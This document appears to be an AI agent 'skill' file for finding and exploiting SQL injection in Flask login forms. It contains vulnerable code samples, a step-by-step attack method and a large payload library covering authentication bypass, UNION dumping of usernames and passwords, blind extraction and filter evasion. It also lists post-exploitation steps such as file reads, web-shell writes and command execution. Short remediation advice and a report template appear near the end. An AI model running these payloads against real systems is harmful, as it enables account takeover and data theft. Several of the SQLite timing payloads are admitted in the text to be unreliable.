# 🗄️ Flask Login Form SQL Injection – Comprehensive AI Bug Bounty Skill

## Skill Name
`flask-sqli-login-bypass`

## Description
Deep-dive detection and exploitation skill for SQL injection vulnerabilities specifically within Python Flask login forms. The skill analyses how user credentials are validated against a relational database (SQLite, PostgreSQL, MySQL), identifies injectable parameters, and provides automated reasoning for bypassing authentication, extracting data, or achieving remote code execution where applicable. Covers both classical SQLi and ORM-specific injection (SQLAlchemy text/raw queries).

## Affected Components
- Raw SQL execution with `cursor.execute()` or `connection.execute()` using string interpolation, `%` formatting, or `f-strings`.
- SQLAlchemy `text()` or `execute()` with unsanitized concatenation.
- Flask endpoint retrieving username/password from `request.form['username']` / `request.form['password']`.
- Any login handler that manually builds queries like:
  ```python
  query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
  ```
- Backend databases: SQLite (common in dev), PostgreSQL, MySQL, MSSQL (via PyODBC).

## Detection Patterns (Static Code Analysis & Dynamic Signs)
### 1. Classic String Concatenation
```python
# Vulnerable
usr = request.form['username']
pwd = request.form['password']
cursor.execute(f"SELECT * FROM users WHERE username='{usr}' AND password='{pwd}'")
```
- **Heuristic**: Variables `usr`, `pwd` embedded directly inside SQL string using `f`, `%`, `.format()`, or `+`.
- **Dynamic probe**: A single quote `'` in username or password triggers a 500 error or database error message (e.g., `sqlite3.OperationalError`, `psycopg2.errors.SyntaxError`).

### 2. SQLAlchemy Raw Text Query Injection
```python
from sqlalchemy import text
db.session.execute(text("SELECT * FROM users WHERE username='"+username+"' AND password='"+password+"'"))
```
- **Heuristic**: Use of `text()` with concatenation; absence of parameter binding via `:param`.
- **Dynamic probe**: Same quote injection reveals SQL error in response or backend logs.

### 3. Blind Injection via Boolean/Time-Based Logic
If error messages are suppressed (generic "Invalid credentials"), the application may still be vulnerable to blind SQLi.
- **Boolean-based**: `' AND 1=1--` vs `' AND 1=2--` leads to different responses (logged in vs not, or different content length).
- **Time-based**: `' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE sqlite3_sleep(5000) END)--` (SQLite) or `pg_sleep(5)` for PostgreSQL.

### 4. Second-Order SQLi
Username stored during registration is later used unsafely in a login query (rare in login itself, but login might fetch user by username unsafely).

### 5. ORM Filter Bypass (Not Direct Injection but Logic Flaw)
Using SQLAlchemy ORM’s `filter()` with raw strings:
```python
User.query.filter("username='%s' AND password='%s'" % (username, password)).first()
```
- **Dynamic test**: Same injection payloads apply.

## Testing Methodology (AI Agent Step-by-Step)
1. **Parameter Discovery**
   - Identify login endpoint, typical POST body: `username=...&password=...`.
   - Confirm if CSRF token is present and if it’s tied to the session. If token is static/predictable, may aid automated fuzzing.

2. **Error Triggering**
   - Inject `'` in username, observe response.
   - If a DB error is returned (stack trace in debug mode), note the DB engine from error message (e.g., `sqlite3`, `psycopg2`, `MySQLdb`).
   - If generic error, proceed to blind techniques.

3. **Authentication Bypass Payloads**
   - Start with universal bypass attempts:
     - `' OR '1'='1` / `' OR '1'='1' --`
     - `admin'--` (comment out rest of query)
     - `' OR 1=1--`
     - `' UNION SELECT 1, 'admin', 'hash'--` (knowing number of columns)
   - If JSON content-type accepted, try NoSQL-ish tricks but SQLi detection: `{"username": "admin'--", "password": "anything"}`.

4. **Column Count Determination for UNION**
   - If error-based or visual feedback available, use `ORDER BY` to find column count:
     `' ORDER BY 1--`, `' ORDER BY 2--`, ... until error.
   - Then craft UNION payload to retrieve data.

5. **Data Extraction via UNION**
   - Determine columns positions that are reflected (e.g., displayed username, welcome message).
   - Payload: `' UNION SELECT 1, group_concat(username, ':', password), 3 FROM users--` (SQLite).
   - For other DBs: `UNION SELECT NULL, username||':'||password, NULL FROM users--`.

6. **Blind SQLi – Boolean**
   - Inject `' AND (SELECT substr(password,1,1) FROM users LIMIT 1)='a'--` and monitor response difference.
   - Automate character-by-character extraction.

7. **Blind SQLi – Time-Based**
   - Use DB-specific delay:
     - SQLite: `' OR (SELECT CASE WHEN (substr(password,1,1)='a') THEN (SELECT 1 FROM (SELECT(SQLITE_VERSION())) UNION SELECT 1 FROM (SELECT(SQLITE_VERSION()))) ELSE 0 END)--` (need more complex sleep).
       Better: `' OR (SELECT 1 FROM (SELECT(SQLITE_VERSION())) WHERE substr(password,1,1)='a')--` but no true sleep; instead conditional errors or heavy query.
     - PostgreSQL: `' OR (SELECT CASE WHEN (substr(password,1,1)='a') THEN pg_sleep(5) ELSE 0 END)--`
     - MySQL: `' OR (SELECT IF(substr(password,1,1)='a', SLEEP(5), 0))--`
   - Measure response time.

8. **Out-of-Band (if network connectivity)**
   - Test if database can make outbound connections (rare in typical sandboxed Flask apps, but possible with `xp_dirtree` in MSSQL or `COPY` in PostgreSQL).

9. **Automation Using AI Inference**
   - The AI can craft tailored payloads based on detected DB engine.
   - It can also interpret SQL error messages to adjust attack vectors (e.g., `unrecognized token` → SQLite, `syntax error at or near` → PostgreSQL).

## Comprehensive Payload Library (Flask Login SQLi)

### Authentication Bypass (Immediate Login)
| Description | Payload (in username field, password can be anything) |
|-------------|--------------------------------------------------------|
| Basic OR always true | `' OR '1'='1` |
| Comment out password check | `admin'--` |
| Parentheses bypass | `') OR ('1'='1` |
| With LIMIT (if subquery) | `' OR 1=1 LIMIT 1--` |
| Null byte trick (old) | `admin'%00` |
| Double dash comment | `admin'-- -` |
| Hash comment (#) | `admin'#` |
| Block comment | `admin'/**/` |

### UNION Injection (Visual Data Extraction)
Determine columns first: `' UNION SELECT 1,2,3--` then replace numbers with database functions.

**SQLite Examples**
- Extract all users: `' UNION SELECT 1, group_concat(username||':'||password), 3 FROM users--`

**PostgreSQL Examples**
- `' UNION SELECT NULL, string_agg(username||':'||password, ','), NULL FROM users--`

**MySQL Examples**
- `' UNION SELECT 1, GROUP_CONCAT(username,':',password SEPARATOR ';'), 3 FROM users#`

### Blind SQLi Payloads
**Boolean-based (PostgreSQL)**
- Check first character: `' AND (SELECT substring(password,1,1) FROM users LIMIT 1)='a'--`
- Use ASCII comparison: `' AND (SELECT ascii(substring(password,1,1)) FROM users LIMIT 1)=97--`

**Time-based**
- PostgreSQL: `' OR (SELECT CASE WHEN (substring(password,1,1)='a') THEN pg_sleep(10) ELSE 0 END FROM users LIMIT 1)--`
- MySQL: `' OR IF(SUBSTRING(password,1,1)='a', SLEEP(10), 0)--`
- SQLite (no native sleep, use heavy computation): `' OR (SELECT CASE WHEN (substring(password,1,1)='a') THEN (SELECT 1 FROM (SELECT(SQLITE_VERSION())) UNION SELECT 1 FROM (SELECT(SQLITE_VERSION()))) ELSE 0 END)--` – detect timing difference, but often unreliable. Prefer boolean or UNION if error-based.

### WAF/Filter Evasion Techniques
- **Whitespace bypass**: Use `/**/` instead of spaces: `'/**/OR/**/1=1--`
- **Keyword obfuscation**: `' OR 1=1--` → `'||1=1--` (MySQL), `' OR '1' LIKE '1'--`
- **Case switching**: `' oR 1=1--`
- **URL encoding**: `%27%20OR%201%3D1--`
- **Double URL encoding**: `%2527` for single quote if app decodes twice.
- **Comment mixing**: `'/**/OR/**/1=1#`

## Post-Exploitation (Beyond Bypass)
- **Credential dumping**: Use UNION to retrieve all usernames/passwords.
- **Reading files (if DB permissions)**: SQLite `readfile()` via `LOAD_EXTENSION` (rare), PostgreSQL `COPY ... TO '/etc/passwd'`, MySQL `LOAD_FILE()`.
- **Writing files (Web Shell)**: `INTO OUTFILE` in MySQL if app runs with FILE privilege and knows web root.
- **Remote Code Execution**: If MSSQL with `xp_cmdshell`, PostgreSQL with `COPY FROM PROGRAM`, SQLite unlikely.

## Secure Coding Recommendations
- **Use parameterised queries always**:
  - For raw DB-API: `cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))`
  - For SQLAlchemy ORM: `User.query.filter_by(username=username).first()` (plus password hash check separately).
  - For SQLAlchemy Core: `db.session.execute(text("SELECT * FROM users WHERE username=:user AND password=:pwd"), {"user": username, "pwd": password})`
- Never concatenate user input into SQL strings.
- Hash passwords with `werkzeug.security.generate_password_hash` / `check_password_hash`.
- Disable debug mode in production (`app.debug = False`).
- Implement WAF rules at application level or proxy.
- Use least-privilege database accounts; revoke FILE, EXECUTE rights.

## Output Format (Bug Report)
Upon successful exploitation, generate:
```
Title: SQL Injection Authentication Bypass in Login Form
Severity: Critical (CVSS 9.8)
Endpoint: POST /login
Vulnerable Parameter: username
DB Engine Detected: SQLite (from error message)
Proof of Concept:
  curl -X POST https://target.com/login -d "username=admin'--&password=irrelevant"
Remediation: Replace raw query with parameterised statement as shown in ...
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with any relational DB via raw SQL or ORM misuse
- **Testing Type**: Black-box/Grey-box
- **Dependencies**: None; AI model can process HTTP traffic, source code snippets, or error messages.